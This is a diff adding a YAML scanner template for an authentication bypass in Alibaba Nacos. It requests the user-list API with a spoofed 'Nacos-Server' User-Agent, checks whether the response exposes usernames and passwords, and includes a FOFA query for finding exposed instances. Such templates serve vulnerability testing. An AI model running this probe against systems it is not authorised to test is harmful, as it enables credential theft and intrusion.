@@ -1,0 +1,25 @@
+id: nacos-user-list-unauthorized
+
+info:
+    name: Alibaba Nacos V1 Auth Bypass
+    author: kmahyyg(https://github.com/kmahyyg)
+    severity: high
+    verified: true
+    description: fofa app="NACOS"
+
+rules:
+    r0:
+        request:
+            method: GET
+            path: /nacos/v1/auth/users?pageNo=1&pageSize=9
+            headers:
+                User-Agent: Nacos-Server
+        expression: response.status == 200 && response.headers["content-type"].contains("application/json") && response.body.bcontains(b'"username":') && response.body.bcontains(b'"password":')
+    r1:
+        request:
+            method: GET
+            path: /v1/auth/users?pageNo=1&pageSize=9
+            headers:
+                User-Agent: Nacos-Server
+        expression: response.status == 200 && response.headers["content-type"].contains("application/json") && response.body.bcontains(b'"username":') && response.body.bcontains(b'"password":')
+expression: r0() || r1()
